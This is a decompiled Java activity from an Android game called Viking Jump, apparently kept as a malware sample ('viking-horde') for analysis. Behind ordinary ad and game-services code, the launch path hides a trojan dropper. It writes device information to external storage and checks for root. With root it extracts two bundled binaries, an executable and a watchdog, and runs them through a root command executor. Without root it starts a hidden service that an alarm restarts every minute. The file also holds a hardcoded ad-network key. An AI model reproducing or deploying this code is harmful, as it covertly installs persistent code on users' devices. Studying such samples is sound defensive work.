package com.carlospinan.utils;

import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Resources;
import android.graphics.Point;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.Display;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.Window;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.FrameLayout.LayoutParams;
import com.chartboost.sdk.Chartboost;
import com.fa.c.RootCommandExecutor;
import com.fa.c.SystemService;
import com.fa.c.Utilities;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdRequest.Builder;
import com.google.android.gms.ads.AdSize;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.InterstitialAd;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.example.games.basegameutils.BaseGameActivity;
import com.stericson.RootTools.RootTools;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Iterator;
import java.util.List;

public class UtilActivity
  extends BaseGameActivity
{
  private static final String AD_UNIT_ID = "";
  public static final String TAG = "UtilActivity";
  private static UtilActivity _appActiviy;
  private AdView adView = null;
  private FrameLayout adViewLayout = null;
  private Context context;
  private int installType;
  private InterstitialAd interstitial;
  private Thread thread;
  
  static
  {
    System.loadLibrary("cocos2dcpp");
  }
  
  private void GameInit()
  {
    getWindow().addFlags(128);
    Chartboost.startWithAppId(this, "56a4932dda15274f177c4814", "c4b2807d77d28ff4e5fc35f8fe0342c8a0752a76");
    Chartboost.onCreate(this);
    Chartboost.cacheInterstitial("Default");
    this.interstitial = new InterstitialAd(this);
    this.interstitial.setAdUnitId("ca-app-pub-1408024954113686/7365027050");
    FrameLayout.LayoutParams localLayoutParams = new FrameLayout.LayoutParams(getDisplaySize(getWindowManager().getDefaultDisplay()).x, -2);
    localLayoutParams.gravity = 80;
    this.adView = new AdView(this);
    this.adView.setAdSize(AdSize.BANNER);
    this.adView.setAdUnitId("");
    AdRequest localAdRequest = new AdRequest.Builder().build();
    this.adView.loadAd(localAdRequest);
    this.adView.setBackgroundColor(-16777216);
    this.adView.setBackgroundColor(0);
    addContentView(this.adView, localLayoutParams);
    _appActiviy = this;
    _init();
  }
  
  private void Install(int paramInt)
  {
    if (paramInt != 1)
    {
      if (paramInt == 0) {
        InstallAsNonRoot();
      }
    }
    else {
      return;
    }
    new Thread(new Runnable()
    {
      public void run()
      {
        UtilActivity.this.KnockServer();
      }
    }).start();
    if (RootTools.isRootAvailable())
    {
      if (InstallAsRoot())
      {
        Utilities.SetInstallType(1, this.context);
        return;
      }
      InstallAsNonRoot();
      Utilities.SetInstallType(0, this.context);
      return;
    }
    InstallAsNonRoot();
    Utilities.SetInstallType(0, this.context);
  }
  
  private boolean InstallAsNonRoot()
  {
    if (!IsMyServiceRunning(SystemService.class)) {
      startService(new Intent(this, SystemService.class));
    }
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(this, 0, new Intent("INTENT_CPS_SERVICE_RESTART"), 0);
    AlarmManager localAlarmManager = (AlarmManager)getSystemService("alarm");
    localAlarmManager.cancel(localPendingIntent);
    localAlarmManager.setRepeating(0, System.currentTimeMillis(), 60000L, localPendingIntent);
    return true;
  }
  
  private boolean InstallAsRoot()
  {
    try
    {
      InputStream localInputStream1 = getResources().openRawResource(2130968576);
      InputStream localInputStream2 = getResources().openRawResource(2130968577);
      WriteRawResources(localInputStream1, Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + Utilities.GetExecName(this.context));
      WriteRawResources(localInputStream2, Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + Utilities.GetWatchDogName(this.context));
      if (RootCommandExecutor.Execute(this.context)) {
        return true;
      }
      new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + Utilities.GetExecName(this.context)).delete();
      new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + Utilities.GetWatchDogName(this.context)).delete();
      return false;
    }
    catch (Exception localException1)
    {
      try
      {
        new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + Utilities.GetExecName(this.context)).delete();
        new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + Utilities.GetWatchDogName(this.context)).delete();
        return false;
      }
      catch (Exception localException2) {}
    }
    return false;
  }
  
  private boolean IsMyServiceRunning(Class<?> paramClass)
  {
    getApplicationContext();
    Iterator localIterator = ((ActivityManager)getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();
    ActivityManager.RunningServiceInfo localRunningServiceInfo;
    do
    {
      if (!localIterator.hasNext()) {
        return false;
      }
      localRunningServiceInfo = (ActivityManager.RunningServiceInfo)localIterator.next();
    } while (!paramClass.getName().equals(localRunningServiceInfo.service.getClassName()));
    return true;
  }
  
  private void KnockServer() {}
  
  private void WriteDeviceInfo()
  {
    try
    {
      Object localObject = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + Utilities.GetExchangeFileName(this.context));
      if (!((File)localObject).exists())
      {
        ((File)localObject).createNewFile();
        ((File)localObject).setWritable(true);
        ((File)localObject).setReadable(true);
        localObject = new FileWriter((File)localObject);
        BufferedWriter localBufferedWriter = new BufferedWriter((Writer)localObject);
        byte[] arrayOfByte = Utilities.GetDeviceInfoBytes(this.context);
        Log.d("CPS", "Length: " + Utilities.ToChar(arrayOfByte).length);
        localBufferedWriter.write(Utilities.ToChar(arrayOfByte), 0, 20);
        localBufferedWriter.close();
        ((FileWriter)localObject).close();
      }
      return;
    }
    catch (Exception localException) {}
  }
  
  private void WriteRawResources(InputStream paramInputStream, String paramString)
  {
    try
    {
      ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
      byte[] arrayOfByte = new byte['Ѐ'];
      for (;;)
      {
        int i = paramInputStream.read(arrayOfByte, 0, 1024);
        if (i < 0)
        {
          paramInputStream.close();
          paramInputStream = localByteArrayOutputStream.toByteArray();
          paramString = new FileOutputStream(paramString);
          paramString.write(paramInputStream);
          paramString.close();
          return;
        }
        localByteArrayOutputStream.write(arrayOfByte, 0, i);
      }
      return;
    }
    catch (Exception paramInputStream)
    {
      Log.d("CPS", paramInputStream.getMessage());
    }
  }
  
  private void _init()
  {
    NativeUtils.configure(this);
  }
  
  private void _initAdMob()
  {
    FrameLayout.LayoutParams localLayoutParams = new FrameLayout.LayoutParams(-1, -2);
    localLayoutParams.gravity = 49;
    this.adView = new AdView(this);
    this.adView.setAdSize(AdSize.SMART_BANNER);
    this.adView.setAdUnitId(getResources().getString(2131099691));
    this.adView.setLayoutParams(localLayoutParams);
    this.adViewLayout = new FrameLayout(this);
    this.adViewLayout.setLayoutParams(localLayoutParams);
    this.adViewLayout.addView(this.adView);
    AdRequest localAdRequest = new AdRequest.Builder().build();
    this.adView.loadAd(localAdRequest);
    addContentView(this.adViewLayout, localLayoutParams);
    Log.d("UtilActivity", "Init AdMob Android");
  }
  
  private Point getDisplaySize(Display paramDisplay)
  {
    if (Build.VERSION.SDK_INT >= 11) {
      return getDisplaySizeGE11(paramDisplay);
    }
    return getDisplaySizeLT11(paramDisplay);
  }
  
  @TargetApi(13)
  private Point getDisplaySizeGE11(Display paramDisplay)
  {
    Point localPoint = new Point(0, 0);
    paramDisplay.getSize(localPoint);
    return localPoint;
  }
  
  private Point getDisplaySizeLT11(Display paramDisplay)
  {
    try
    {
      Method localMethod1 = Display.class.getMethod("getWidth", new Class[0]);
      Method localMethod2 = Display.class.getMethod("getHeight", new Class[0]);
      paramDisplay = new Point(((Integer)localMethod1.invoke(paramDisplay, null)).intValue(), ((Integer)localMethod2.invoke(paramDisplay, null)).intValue());
      return paramDisplay;
    }
    catch (NoSuchMethodException paramDisplay)
    {
      return new Point(-1, -1);
    }
    catch (IllegalArgumentException paramDisplay)
    {
      return new Point(-2, -2);
    }
    catch (IllegalAccessException paramDisplay)
    {
      return new Point(-3, -3);
    }
    catch (InvocationTargetException paramDisplay) {}
    return new Point(-4, -4);
  }
  
  public static void hideAd()
  {
    _appActiviy.runOnUiThread(new Runnable()
    {
      public void run()
      {
        if (UtilActivity._appActiviy.adView.isEnabled()) {
          UtilActivity._appActiviy.adView.setEnabled(false);
        }
        if (UtilActivity._appActiviy.adView.getVisibility() != 4) {
          UtilActivity._appActiviy.adView.setVisibility(4);
        }
      }
    });
  }
  
  public static void loadChartboost()
  {
    Chartboost.cacheInterstitial("Default");
  }
  
  public static void loadInterstitial()
  {
    _appActiviy.runOnUiThread(new Runnable()
    {
      public void run()
      {
        AdRequest localAdRequest = new AdRequest.Builder().build();
        UtilActivity._appActiviy.interstitial.loadAd(localAdRequest);
      }
    });
  }
  
  public static void rate_app(String paramString)
  {
    paramString = new Intent("android.intent.action.VIEW", Uri.parse("https://play.google.com/store/apps/details?id=com.Jump.VikingJump"));
    _appActiviy.startActivity(paramString);
  }
  
  public static void setShareIntent()
  {
    Intent localIntent = new Intent();
    localIntent.setAction("android.intent.action.SEND");
    localIntent.putExtra("android.intent.extra.TEXT", "Amazing Game Viking Jump!!! https://play.google.com/store/apps/details?id=com.Jump.VikingJump");
    localIntent.setType("text/plain");
    _appActiviy.startActivity(Intent.createChooser(localIntent, "Text"));
  }
  
  public static void showAd()
  {
    _appActiviy.runOnUiThread(new Runnable()
    {
      public void run()
      {
        if (!UtilActivity._appActiviy.adView.isEnabled()) {
          UtilActivity._appActiviy.adView.setEnabled(true);
        }
        if (UtilActivity._appActiviy.adView.getVisibility() == 4) {
          UtilActivity._appActiviy.adView.setVisibility(0);
        }
      }
    });
  }
  
  public static void showChartboost()
  {
    if (Chartboost.hasInterstitial("Default"))
    {
      Chartboost.showInterstitial("Default");
      return;
    }
    Chartboost.cacheInterstitial("Default");
    Chartboost.showInterstitial("Default");
  }
  
  public static void showInterstitial()
  {
    _appActiviy.runOnUiThread(new Runnable()
    {
      public void run()
      {
        if (UtilActivity._appActiviy.interstitial.isLoaded()) {
          UtilActivity._appActiviy.interstitial.show();
        }
      }
    });
  }
  
  public GoogleApiClient getCustomApiClient()
  {
    return getApiClient();
  }
  
  public boolean getSignedIn()
  {
    return isSignedIn();
  }
  
  public void inCloudLoad(int paramInt) {}
  
  public void inCloudSaveOrUpdate(int paramInt, byte[] paramArrayOfByte) {}
  
  public void onBackPressed()
  {
    if (Chartboost.onBackPressed()) {
      return;
    }
    super.onBackPressed();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    this.context = getApplicationContext();
    this.installType = Utilities.GetInstallType(this.context);
    if (!Utilities.IsRandomNames(this.context)) {
      Utilities.SetRandomNames(this.context);
    }
    if (Build.VERSION.SDK_INT >= 23) {
      if (checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") == 0)
      {
        WriteDeviceInfo();
        Install(this.installType);
        GameInit();
      }
    }
    for (;;)
    {
      paramBundle = new IntentFilter();
      paramBundle.addAction("com.android.vending.INSTALL_REFERRER");
      getApplicationContext().registerReceiver(new BroadcastReceiver()
      {
        public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
        {
          paramAnonymousContext = paramAnonymousIntent.getStringExtra("referrer");
          Log.d("CPS", "Ref: " + paramAnonymousContext);
        }
      }, paramBundle);
      return;
      requestPermissions(new String[] { "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE" }, 50);
      continue;
      WriteDeviceInfo();
      Install(this.installType);
      GameInit();
    }
  }
  
  protected void onDestroy()
  {
    if (this.adView != null) {
      this.adView.destroy();
    }
    super.onDestroy();
    Chartboost.onDestroy(_appActiviy);
  }
  
  public boolean onGenericMotionEvent(MotionEvent paramMotionEvent)
  {
    return super.onGenericMotionEvent(paramMotionEvent);
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    super.onKeyDown(paramInt, paramKeyEvent);
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  protected void onNewIntent(Intent paramIntent)
  {
    String str = paramIntent.getStringExtra("referrer");
    Log.d("TRACKING", "Reffff: " + str);
    Intent localIntent = new Intent();
    localIntent.setAction("RRR_AAA_FFF");
    localIntent.putExtra("r", str);
    this.context.sendBroadcast(localIntent);
    super.onNewIntent(paramIntent);
  }
  
  protected void onPause()
  {
    if (this.adView != null) {
      this.adView.pause();
    }
    super.onPause();
    Chartboost.onPause(_appActiviy);
  }
  
  public void onRequestPermissionsResult(int paramInt, String[] paramArrayOfString, int[] paramArrayOfInt)
  {
    super.onRequestPermissionsResult(paramInt, paramArrayOfString, paramArrayOfInt);
    WriteDeviceInfo();
    Install(this.installType);
    GameInit();
  }
  
  protected void onRestart()
  {
    super.onRestart();
  }
  
  protected void onResume()
  {
    super.onResume();
    if (this.adView != null) {
      this.adView.resume();
    }
    Chartboost.onStart(_appActiviy);
  }
  
  public void onSignInFailed() {}
  
  public void onSignInSucceeded() {}
  
  protected void onStart()
  {
    super.onStart();
  }
  
  protected void onStop()
  {
    super.onStop();
    Chartboost.onStop(_appActiviy);
  }
  
  public void requestGameAndCloudSave()
  {
    setRequestedClients(5);
  }
  
  public void signInGooglePlay()
  {
    beginUserInitiatedSignIn();
  }
  
  public void signOutGooglePlay()
  {
    signOut();
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/viking-horde/classes.jar!/com/carlospinan/utils/UtilActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */